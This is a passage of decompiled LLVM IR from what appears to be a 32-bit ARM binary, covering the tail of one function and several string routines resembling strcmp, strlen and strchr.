  store i32 %v2_11478, i32* %r2.global-to-local, align 4
  %v4_11478 = add i32 %v0_1146c, 2147483632
  %v5_11478 = and i32 %v2_11478, %v4_11478
  %v6_11478 = icmp slt i32 %v5_11478, 0
  store i1 %v6_11478, i1* %cpsr_v.global-to-local, align 1
  %v7_11478 = icmp slt i32 %v2_11478, 0
  store i1 %v7_11478, i1* %cpsr_n.global-to-local, align 1
  %v8_11478 = icmp eq i32 %v2_11478, 0
  store i1 %v8_11478, i1* %cpsr_z.global-to-local, align 1
  %v5_1147c = icmp slt i32 %v2_1146c, -12
  br i1 %v5_1147c, label %dec_label_pc_11498, label %dec_label_pc_11480

dec_label_pc_11480:                               ; preds = %dec_label_pc_11474, %dec_label_pc_11434, %dec_label_pc_11480
  %v1_1148c = phi i32 [ %v5_1148c, %dec_label_pc_11480 ], [ %v1_11468, %dec_label_pc_11474 ], [ %v0_1139023, %dec_label_pc_11434 ]
  %v0_11480 = load i32, i32* %r3.global-to-local, align 4
  %v3_11480 = mul i32 %v0_11480, 16777216
  store i32 %v3_11480, i32* %ip.global-to-local, align 4
  %v0_11484 = load i32, i32* %r1.global-to-local, align 4
  %v1_11484 = add i32 %v0_11484, -4
  %v2_11484 = inttoptr i32 %v1_11484 to i32*
  %v3_11484 = load i32, i32* %v2_11484, align 4
  store i32 %v3_11484, i32* %r3.global-to-local, align 4
  store i32 %v1_11484, i32* %r1.global-to-local, align 4
  %v4_11488 = udiv i32 %v3_11484, 256
  %v5_11488 = or i32 %v4_11488, %v3_11480
  store i32 %v5_11488, i32* %ip.global-to-local, align 4
  %v2_1148c = add i32 %v1_1148c, -4
  %v3_1148c = inttoptr i32 %v2_1148c to i32*
  store i32 %v5_11488, i32* %v3_1148c, align 4
  %v4_1148c = load i32, i32* %r0.global-to-local, align 4
  %v5_1148c = add i32 %v4_1148c, -4
  store i32 %v5_1148c, i32* %r0.global-to-local, align 4
  %v0_11490 = load i32, i32* %r2.global-to-local, align 4
  %v2_11490 = add i32 %v0_11490, -4
  store i32 %v2_11490, i32* %r2.global-to-local, align 4
  %v6_11494 = icmp slt i32 %v0_11490, 4
  br i1 %v6_11494, label %dec_label_pc_11498.loopexit, label %dec_label_pc_11480

dec_label_pc_11498.loopexit:                      ; preds = %dec_label_pc_11480
  %v4_11490 = sub i32 3, %v0_11490
  %v5_11490 = and i32 %v4_11490, %v0_11490
  %v6_11490 = icmp slt i32 %v5_11490, 0
  %v7_11490 = icmp slt i32 %v2_11490, 0
  store i1 %v6_11490, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_11490, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11498

dec_label_pc_11498:                               ; preds = %dec_label_pc_11498.loopexit, %dec_label_pc_11474
  %v2_1130457 = phi i32 [ %v5_1148c, %dec_label_pc_11498.loopexit ], [ %v1_11468, %dec_label_pc_11474 ]
  %v0_112f453 = phi i32 [ %v2_11490, %dec_label_pc_11498.loopexit ], [ %v2_11478, %dec_label_pc_11474 ]
  %v0_11498 = load i32, i32* %r1.global-to-local, align 4
  %v1_11498 = add i32 %v0_11498, 1
  store i32 %v1_11498, i32* %r1.global-to-local, align 4
  br label %bb68

; uselistorder directives
  uselistorder i32 %v5_1148c, { 0, 2, 1 }
  uselistorder i32 %v3_11480, { 1, 0 }
  uselistorder i32 %v2_11478, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_11468, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_11448, { 1, 0 }
  uselistorder i32 %v3_11444, { 1, 0 }
  uselistorder i32 %v0_11448, { 3, 2, 1, 0 }
  uselistorder i32 %v0_11468, { 3, 2, 1, 0 }
  uselistorder i32 %v5_11420, { 0, 2, 1 }
  uselistorder i32 %v3_11414, { 1, 0 }
  uselistorder i32 %v2_1140c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_113fc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_113dc, { 1, 0 }
  uselistorder i32 %v3_113d8, { 1, 0 }
  uselistorder i32 %v0_113dc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_113fc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_113b4, { 0, 2, 1 }
  uselistorder i32 %v3_113a8, { 1, 0 }
  uselistorder i32 %v2_113a0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_11390, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_11370, { 1, 0 }
  uselistorder i32 %v3_1136c, { 1, 0 }
  uselistorder i32 %v0_11370, { 3, 2, 1, 0 }
  uselistorder i32 %v0_11390, { 3, 2, 1, 0 }
  uselistorder i1 %v5_11438, { 2, 0, 1 }
  uselistorder i32 %v0_11350, { 1, 0 }
  uselistorder i32 %v0_1143c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1139023, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_11340, { 2, 1, 0 }
  uselistorder i32 %v0_11340, { 2, 0, 1 }
  uselistorder i32 %v2_11338, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_11338, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11338, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1139024, { 2, 1, 0 }
  uselistorder i32 %v11_11314, { 1, 0 }
  uselistorder i32 %v7_11314, { 1, 0 }
  uselistorder i32 %v1_112f4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_112f4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_112f8, { 1, 0 }
  uselistorder i32 %v7_112ec, { 0, 2, 1 }
  uselistorder i32 %v10_112e8, { 1, 0 }
  uselistorder i32 %v9_112e0, { 1, 0, 2 }
  uselistorder i32 %v6_112dc, { 1, 0 }
  uselistorder i32 %v2_112d4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_112d4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_112e4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_112c8, { 0, 2, 1 }
  uselistorder i32 %v13_112c4, { 1, 0 }
  uselistorder i32 %v4_112c0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_112c0, { 2, 0, 1 }
  uselistorder i32 %v6_112c8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_112b8, { 0, 2, 1 }
  uselistorder i32 %v16_112b4, { 1, 0 }
  uselistorder i32 %v4_112b0, { 1, 2, 0 }
  uselistorder i32 %v0_112c0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_112b8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_112a4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_112a0, { 1, 0 }
  uselistorder i32 %v1_1129c, { 1, 0 }
  uselistorder i32 %v10_11298, { 1, 0 }
  uselistorder i32 %v0_11298, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1129c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_11290, { 0, 2, 1 }
  uselistorder i32 %v2_11284, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_11284, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1129c41, { 1, 2, 0 }
  uselistorder i32 %v1_1127c, { 2, 1, 0 }
  uselistorder i32 %v1_11274, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1126c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_11268, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_11264, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_11264, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v4_11250, { 1, 0 }
  uselistorder i32 %v3_11244, { 1, 0 }
  uselistorder i32 %v2_1123c, { 1, 2, 0, 3 }
  uselistorder i32 %v12_1122c, { 0, 2, 1 }
  uselistorder i32 %v8_1120c, { 1, 0, 2 }
  uselistorder i32 %v5_1120c, { 1, 0, 2 }
  uselistorder i32 %v2_1120c, { 1, 0, 2 }
  uselistorder i32 %v3_11208, { 1, 0 }
  uselistorder i32 %v0_1122c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_111f8, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v4_111e4, { 1, 0 }
  uselistorder i32 %v3_111d8, { 1, 0 }
  uselistorder i32 %v2_111d0, { 1, 2, 0, 3 }
  uselistorder i32 %v12_111c0, { 0, 2, 1 }
  uselistorder i32 %v8_111a0, { 1, 0, 2 }
  uselistorder i32 %v5_111a0, { 1, 0, 2 }
  uselistorder i32 %v2_111a0, { 1, 0, 2 }
  uselistorder i32 %v3_1119c, { 1, 0 }
  uselistorder i32 %v0_111c0, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 37, 38 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 24, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 29 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 6, 2, 8, 4, 9, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24, 3, 25, 26, 5, 27 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 6, 2, 8, 4, 9, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 21, 22, 3, 23, 24, 5, 25 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 6, 2, 8, 4, 9, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 3, 26, 27, 5, 28 }
  uselistorder i32 -3, { 0, 1, 3, 2 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 27, { 0, 1, 4, 2, 5, 3 }
  uselistorder i32 ()* @function_110ac, { 1, 0 }
  uselistorder i32 -12, { 2, 14, 15, 3, 17, 18, 4, 19, 20, 16, 13, 12, 11, 10, 9, 21, 22, 23, 5, 24, 6, 25, 26, 8, 0, 7, 1, 27, 28 }
  uselistorder label %dec_label_pc_11480, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11414, { 2, 0, 1 }
  uselistorder label %dec_label_pc_113a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11348, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb68, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_112d4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_11298, { 1, 0 }
  uselistorder label %dec_label_pc_11284, { 1, 0 }
  uselistorder label %dec_label_pc_11244, { 2, 0, 1 }
  uselistorder label %dec_label_pc_111d8, { 1, 0 }
}

define i32 @function_114a0(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_114a4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_114a0

dec_label_pc_114a0:                               ; preds = %bb3, %bb
  %v0_114a4 = phi i32 [ %v0_114a4.pre, %bb ], [ %v5_114a4, %bb3 ]
  %v0_114a0 = phi i32 [ %tmp, %bb ], [ %v5_114a0, %bb3 ]
  %v1_114a0 = inttoptr i32 %v0_114a0 to i8*
  %v2_114a0 = load i8, i8* %v1_114a0, align 1
  %v1_114a4 = inttoptr i32 %v0_114a4 to i8*
  %v2_114a4 = load i8, i8* %v1_114a4, align 1
  %v3_114a4 = zext i8 %v2_114a4 to i32
  %v2_114a8 = icmp eq i8 %v2_114a0, 0
  br i1 %v2_114a8, label %.dec_label_pc_114b4_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_114a0
  %v5_114a4 = add i32 %v0_114a4, 1
  %v5_114a0 = add i32 %v0_114a0, 1
  %v3_114a0 = zext i8 %v2_114a0 to i32
  %v10_114ac = icmp eq i8 %v2_114a0, %v2_114a4
  br i1 %v10_114ac, label %dec_label_pc_114a0, label %dec_label_pc_114b4

.dec_label_pc_114b4_crit_edge:                    ; preds = %dec_label_pc_114a0
  br label %dec_label_pc_114b4

dec_label_pc_114b4:                               ; preds = %bb3, %.dec_label_pc_114b4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_114b4_crit_edge ], [ %v3_114a0, %bb3 ]
  %v2_114b4.pre-phi = sub nsw i32 %.pn, %v3_114a4
  ret i32 %v2_114b4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_114a0, { 0, 2, 1 }
  uselistorder i32 %v0_114a0, { 1, 0 }
  uselistorder i32 %v0_114a4, { 1, 0 }
  uselistorder label %dec_label_pc_114b4, { 1, 0 }
}

define i32 @function_114c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_114c0:
  %v1_114c0 = and i32 %arg1, -4
  %v1_114c4 = inttoptr i32 %v1_114c0 to i32*
  %v2_114c4 = load i32, i32* %v1_114c4, align 4
  %v1_114c8 = urem i32 %arg1, 4
  %v2_114c8 = icmp eq i32 %v1_114c8, 0
  %v1_114cc = sub nsw i32 0, %v1_114c8
  br i1 %v2_114c8, label %.preheader.preheader, label %dec_label_pc_114d4

dec_label_pc_114d4:                               ; preds = %dec_label_pc_114c0
  %v1_114d4 = or i32 %v2_114c4, 255
  %v7_114d8 = icmp eq i32 %v1_114c8, 1
  br i1 %v7_114d8, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_114d4
  %v9_114dc = or i32 %v2_114c4, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_114d4, %bb
  %v8_114e4 = phi i32 [ %v1_114d4, %dec_label_pc_114d4 ], [ %v9_114dc, %bb ]
  %v7_114e4 = icmp eq i32 %v1_114c8, 3
  br i1 %v7_114e4, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_114e4 = or i32 %v8_114e4, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_114c0
  %v1_114f4.ph = phi i32 [ %v2_114c4, %dec_label_pc_114c0 ], [ %v9_114e4, %bb34 ], [ %v8_114e4, %bb33 ]
  %v1_114e838 = urem i32 %v1_114f4.ph, 256
  %v2_114e839 = icmp eq i32 %v1_114e838, 0
  %v2_114ec40 = and i32 %v1_114f4.ph, 65280
  %v3_114ec41 = icmp eq i32 %v2_114ec40, 0
  %or.cond42 = or i1 %v2_114e839, %v3_114ec41
  %v2_114f043 = and i32 %v1_114f4.ph, 16711680
  %v3_114f044 = icmp eq i32 %v2_114f043, 0
  %or.cond3145 = or i1 %v3_114f044, %or.cond42
  %v4_114f446 = icmp ult i32 %v1_114f4.ph, 16777216
  %or.cond3247 = or i1 %v4_114f446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_11504, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_114f81349 = phi i32 [ %v2_114f814, %.thread4 ], [ %v1_114cc, %.preheader.preheader ]
  %v1_114fc48.in = phi i32 [ %v1_114fc48, %.thread4 ], [ %v1_114c0, %.preheader.preheader ]
  %v1_114fc48 = add i32 %v1_114fc48.in, 4
  %v2_114f814 = add i32 %v1_114f81349, 4
  %v2_114fc = inttoptr i32 %v1_114fc48 to i32*
  %v3_114fc = load i32, i32* %v2_114fc, align 4
  %v1_114e8 = urem i32 %v3_114fc, 256
  %v2_114e8 = icmp eq i32 %v1_114e8, 0
  %v2_114ec = and i32 %v3_114fc, 65280
  %v3_114ec = icmp eq i32 %v2_114ec, 0
  %or.cond = or i1 %v2_114e8, %v3_114ec
  %v2_114f0 = and i32 %v3_114fc, 16711680
  %v3_114f0 = icmp eq i32 %v2_114f0, 0
  %or.cond31 = or i1 %v3_114f0, %or.cond
  %v4_114f4 = icmp ult i32 %v3_114fc, 16777216
  %or.cond32 = or i1 %v4_114f4, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_11504, label %.thread4

dec_label_pc_11504:                               ; preds = %.thread4, %.preheader.preheader
  %v1_114f813.lcssa = phi i32 [ %v1_114cc, %.preheader.preheader ], [ %v2_114f814, %.thread4 ]
  %v2_114e8.lcssa = phi i1 [ %v2_114e839, %.preheader.preheader ], [ %v2_114e8, %.thread4 ]
  %v3_114ec.lcssa = phi i1 [ %v3_114ec41, %.preheader.preheader ], [ %v3_114ec, %.thread4 ]
  %v3_114f0.lcssa = phi i1 [ %v3_114f044, %.preheader.preheader ], [ %v3_114f0, %.thread4 ]
  br i1 %v2_114e8.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_11504
  %v2_11508 = add i32 %v1_114f813.lcssa, 1
  br i1 %v3_114ec.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_1151017 = add i32 %v1_114f813.lcssa, 2
  br i1 %v3_114f0.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_11518 = add i32 %v1_114f813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_11504, %bb35, %bb36, %bb37
  %v1_1151c = phi i32 [ %v2_11508, %bb35 ], [ %v2_1151017, %bb36 ], [ %v2_11518, %bb37 ], [ %v1_114f813.lcssa, %dec_label_pc_11504 ]
  ret i32 %v1_1151c

; uselistorder directives
  uselistorder i32 %v1_114f813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_114fc, { 3, 2, 1, 0 }
  uselistorder i32 %v1_114f4.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_114c8, { 3, 2, 1, 0 }
  uselistorder i32 65280, { 3, 0, 4, 1, 2 }
  uselistorder i32 16711680, { 1, 0, 2 }
  uselistorder i32 65535, { 0, 4, 5, 1, 2, 3 }
  uselistorder i32 255, { 20, 5, 0, 1, 2, 13, 14, 15, 4, 3, 6, 16, 7, 8, 17, 9, 10, 18, 11, 12, 19 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_11520(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11520:
  store i32 %arg1, i32* @r1, align 4
  %v1_11524 = urem i32 %arg1, 256
  %v0_115443 = load i32, i32* @r0, align 4
  %v1_115444 = urem i32 %v0_115443, 4
  %v2_115445 = icmp eq i32 %v1_115444, 0
  br i1 %v2_115445, label %dec_label_pc_1154c, label %dec_label_pc_1152c

dec_label_pc_1152c:                               ; preds = %dec_label_pc_11520, %dec_label_pc_11540
  %v0_11540 = phi i32 [ %v1_11540, %dec_label_pc_11540 ], [ %v0_115443, %dec_label_pc_11520 ]
  %v1_1152c = inttoptr i32 %v0_11540 to i8*
  %v2_1152c = load i8, i8* %v1_1152c, align 1
  %v3_1152c = zext i8 %v2_1152c to i32
  %v9_11530 = icmp eq i32 %v3_1152c, %v1_11524
  br i1 %v9_11530, label %dec_label_pc_11600, label %dec_label_pc_11538

dec_label_pc_11538:                               ; preds = %dec_label_pc_1152c
  %v2_11538 = icmp eq i8 %v2_1152c, 0
  br i1 %v2_11538, label %dec_label_pc_115fc, label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %dec_label_pc_11538
  %v1_11540 = add i32 %v0_11540, 1
  %v1_11544 = urem i32 %v1_11540, 4
  %v2_11544 = icmp eq i32 %v1_11544, 0
  br i1 %v2_11544, label %dec_label_pc_1154c, label %dec_label_pc_1152c

dec_label_pc_1154c:                               ; preds = %dec_label_pc_11540, %dec_label_pc_11520
  %v0_11550 = phi i32 [ %v0_115443, %dec_label_pc_11520 ], [ %v1_11540, %dec_label_pc_11540 ]
  %v4_1154c = mul nuw nsw i32 %v1_11524, 256
  %v5_1154c = or i32 %v4_1154c, %v1_11524
  %v4_11554 = mul i32 %v5_1154c, 65536
  %v5_11554 = or i32 %v4_11554, %v5_1154c
  br label %dec_label_pc_11558

dec_label_pc_11558:                               ; preds = %dec_label_pc_115f4, %dec_label_pc_11594, %dec_label_pc_1154c
  %v0_115bc = phi i32 [ %v0_11550, %dec_label_pc_1154c ], [ %v4_11558, %dec_label_pc_11594 ], [ %v4_11558, %dec_label_pc_115f4 ]
  %v1_11558 = inttoptr i32 %v0_115bc to i32*
  %v2_11558 = load i32, i32* %v1_11558, align 4
  %v4_11558 = add i32 %v0_115bc, 4
  %v2_11560 = xor i32 %v2_11558, %v5_11554
  %v2_1156c = add i32 %v2_11558, 2130640639
  %v1_11570 = sub i32 -1, %v2_11558
  %v2_11574 = xor i32 %v2_1156c, %v1_11570
  %v2_11580 = and i32 %v2_11574, -2130640640
  store i32 %v2_11580, i32* @r1, align 4
  %v2_11588 = icmp eq i32 %v2_11580, 0
  br i1 %v2_11588, label %dec_label_pc_11594, label %dec_label_pc_1159c

dec_label_pc_11594:                               ; preds = %dec_label_pc_11558
  %v2_11564 = add i32 %v2_11560, 2130640639
  %v1_1157c = sub i32 -1, %v2_11560
  %v2_11584 = xor i32 %v2_11564, %v1_1157c
  %v2_1158c = and i32 %v2_11584, -2130640640
  %v2_11594 = icmp eq i32 %v2_1158c, 0
  br i1 %v2_11594, label %dec_label_pc_11558, label %dec_label_pc_1159c

dec_label_pc_1159c:                               ; preds = %dec_label_pc_11558, %dec_label_pc_11594
  %v2_1159c = inttoptr i32 %v0_115bc to i8*
  %v3_1159c = load i8, i8* %v2_1159c, align 1
  %v4_1159c = zext i8 %v3_1159c to i32
  %v9_115a0 = icmp eq i32 %v4_1159c, %v1_11524
  br i1 %v9_115a0, label %dec_label_pc_11600, label %dec_label_pc_115ac

dec_label_pc_115ac:                               ; preds = %dec_label_pc_1159c
  %v2_115ac = icmp eq i8 %v3_1159c, 0
  br i1 %v2_115ac, label %dec_label_pc_115fc, label %dec_label_pc_115b4

dec_label_pc_115b4:                               ; preds = %dec_label_pc_115ac
  %v1_115b4 = add i32 %v0_115bc, 1
  %v2_115b4 = inttoptr i32 %v1_115b4 to i8*
  %v3_115b4 = load i8, i8* %v2_115b4, align 1
  %v4_115b4 = zext i8 %v3_115b4 to i32
  %v9_115b8 = icmp eq i32 %v4_115b4, %v1_11524
  br i1 %v9_115b8, label %dec_label_pc_11600, label %dec_label_pc_115c4

dec_label_pc_115c4:                               ; preds = %dec_label_pc_115b4
  %v2_115c4 = icmp eq i8 %v3_115b4, 0
  br i1 %v2_115c4, label %dec_label_pc_115fc, label %dec_label_pc_115cc

dec_label_pc_115cc:                               ; preds = %dec_label_pc_115c4
  %v1_115cc = add i32 %v0_115bc, 2
  %v2_115cc = inttoptr i32 %v1_115cc to i8*
  %v3_115cc = load i8, i8* %v2_115cc, align 1
  %v4_115cc = zext i8 %v3_115cc to i32
  %v9_115d0 = icmp eq i32 %v4_115cc, %v1_11524
  br i1 %v9_115d0, label %dec_label_pc_11600, label %dec_label_pc_115dc

dec_label_pc_115dc:                               ; preds = %dec_label_pc_115cc
  %v2_115dc = icmp eq i8 %v3_115cc, 0
  br i1 %v2_115dc, label %dec_label_pc_115fc, label %dec_label_pc_115e4

dec_label_pc_115e4:                               ; preds = %dec_label_pc_115dc
  %v1_115e4 = add i32 %v0_115bc, 3
  %v2_115e4 = inttoptr i32 %v1_115e4 to i8*
  %v3_115e4 = load i8, i8* %v2_115e4, align 1
  %v4_115e4 = zext i8 %v3_115e4 to i32
  %v9_115e8 = icmp eq i32 %v4_115e4, %v1_11524
  br i1 %v9_115e8, label %dec_label_pc_11600, label %dec_label_pc_115f4

dec_label_pc_115f4:                               ; preds = %dec_label_pc_115e4
  %v2_115f4 = icmp eq i8 %v3_115e4, 0
  br i1 %v2_115f4, label %dec_label_pc_115fc, label %dec_label_pc_11558

dec_label_pc_115fc:                               ; preds = %dec_label_pc_11538, %dec_label_pc_115f4, %dec_label_pc_115dc, %dec_label_pc_115c4, %dec_label_pc_115ac
  br label %dec_label_pc_11600

dec_label_pc_11600:                               ; preds = %dec_label_pc_1152c, %dec_label_pc_115e4, %dec_label_pc_115cc, %dec_label_pc_115b4, %dec_label_pc_1159c, %dec_label_pc_115fc
  %v1_11604 = phi i32 [ 0, %dec_label_pc_115fc ], [ %v1_115e4, %dec_label_pc_115e4 ], [ %v1_115cc, %dec_label_pc_115cc ], [ %v1_115b4, %dec_label_pc_115b4 ], [ %v0_115bc, %dec_label_pc_1159c ], [ %v0_11540, %dec_label_pc_1152c ]
  ret i32 %v1_11604

; uselistorder directives
  uselistorder i32 %v4_11558, { 1, 0 }
  uselistorder i32 %v2_11558, { 0, 2, 1 }
  uselistorder i32 %v0_115bc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1154c, { 1, 0 }
  uselistorder i32 %v1_11540, { 1, 0, 2 }
  uselistorder i32 %v0_115443, { 2, 1, 0 }
  uselistorder i32 %v1_11524, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_11600, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_115fc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1159c, { 1, 0 }
  uselistorder label %dec_label_pc_1152c, { 1, 0 }
}

define i32 @function_11610(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11610:
  store i32 %arg1, i32* @r1, align 4
  %v1_11614 = urem i32 %arg1, 256
  %v0_116342 = load i32, i32* @r0, align 4
  %v1_116343 = urem i32 %v0_116342, 4
  %v2_116344 = icmp eq i32 %v1_116343, 0
  br i1 %v2_116344, label %dec_label_pc_1163c, label %dec_label_pc_1161c

dec_label_pc_1161c:                               ; preds = %dec_label_pc_11610, %dec_label_pc_11630
  %v0_11630 = phi i32 [ %v1_11630, %dec_label_pc_11630 ], [ %v0_116342, %dec_label_pc_11610 ]
  %v1_1161c = inttoptr i32 %v0_11630 to i8*
  %v2_1161c = load i8, i8* %v1_1161c, align 1
  %v3_1161c = zext i8 %v2_1161c to i32
  %v9_11620 = icmp eq i32 %v3_1161c, %v1_11614
  br i1 %v9_11620, label %dec_label_pc_116ec, label %dec_label_pc_11628

dec_label_pc_11628:                               ; preds = %dec_label_pc_1161c
  %v2_11628 = icmp eq i8 %v2_1161c, 0
  br i1 %v2_11628, label %dec_label_pc_116ec, label %dec_label_pc_11630

dec_label_pc_11630:                               ; preds = %dec_label_pc_11628
  %v1_11630 = add i32 %v0_11630, 1
  %v1_11634 = urem i32 %v1_11630, 4
  %v2_11634 = icmp eq i32 %v1_11634, 0
  br i1 %v2_11634, label %dec_label_pc_1163c, label %dec_label_pc_1161c

dec_label_pc_1163c:                               ; preds = %dec_label_pc_11630, %dec_label_pc_11610
  %v0_11640 = phi i32 [ %v0_116342, %dec_label_pc_11610 ], [ %v1_11630, %dec_label_pc_11630 ]
  %v4_1163c = mul nuw nsw i32 %v1_11614, 256
  %v5_1163c = or i32 %v4_1163c, %v1_11614
  %v4_11644 = mul i32 %v5_1163c, 65536
  %v5_11644 = or i32 %v4_11644, %v5_1163c
  br label %dec_label_pc_11648

dec_label_pc_11648:                               ; preds = %dec_label_pc_116e4, %dec_label_pc_11684, %dec_label_pc_1163c
  %v0_116ac = phi i32 [ %v0_11640, %dec_label_pc_1163c ], [ %v4_11648, %dec_label_pc_11684 ], [ %v4_11648, %dec_label_pc_116e4 ]
  %v1_11648 = inttoptr i32 %v0_116ac to i32*
  %v2_11648 = load i32, i32* %v1_11648, align 4
  %v4_11648 = add i32 %v0_116ac, 4
  %v2_11650 = xor i32 %v2_11648, %v5_11644
  %v2_1165c = add i32 %v2_11648, 2130640639
  %v1_11660 = sub i32 -1, %v2_11648
  %v2_11664 = xor i32 %v2_1165c, %v1_11660
  %v2_11670 = and i32 %v2_11664, -2130640640
  store i32 %v2_11670, i32* @r1, align 4
  %v2_11678 = icmp eq i32 %v2_11670, 0
  br i1 %v2_11678, label %dec_label_pc_11684, label %dec_label_pc_1168c

dec_label_pc_11684:                               ; preds = %dec_label_pc_11648
  %v2_11654 = add i32 %v2_11650, 2130640639
  %v1_1166c = sub i32 -1, %v2_11650
  %v2_11674 = xor i32 %v2_11654, %v1_1166c
  %v2_1167c = and i32 %v2_11674, -2130640640
  %v2_11684 = icmp eq i32 %v2_1167c, 0
  br i1 %v2_11684, label %dec_label_pc_11648, label %dec_label_pc_1168c

dec_label_pc_1168c:                               ; preds = %dec_label_pc_11648, %dec_label_pc_11684
  %v2_1168c = inttoptr i32 %v0_116ac to i8*
  %v3_1168c = load i8, i8* %v2_1168c, align 1
  %v4_1168c = zext i8 %v3_1168c to i32
  %v9_11690 = icmp eq i32 %v4_1168c, %v1_11614
  br i1 %v9_11690, label %dec_label_pc_116ec, label %dec_label_pc_1169c

